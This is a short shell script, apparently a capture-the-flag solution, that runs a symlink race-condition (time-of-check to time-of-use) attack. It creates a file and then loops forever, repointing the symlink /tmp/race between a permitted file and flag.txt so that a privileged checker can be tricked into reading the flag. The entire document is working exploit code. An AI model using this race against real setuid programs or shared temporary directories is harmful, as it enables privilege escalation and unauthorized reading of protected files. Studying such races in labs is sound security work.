#!/bin/sh
touch has_perms
touch /tmp/hackfile
while true; do
    ln -sf has_perms /tmp/race
    ln -sf flag.txt /tmp/race
done
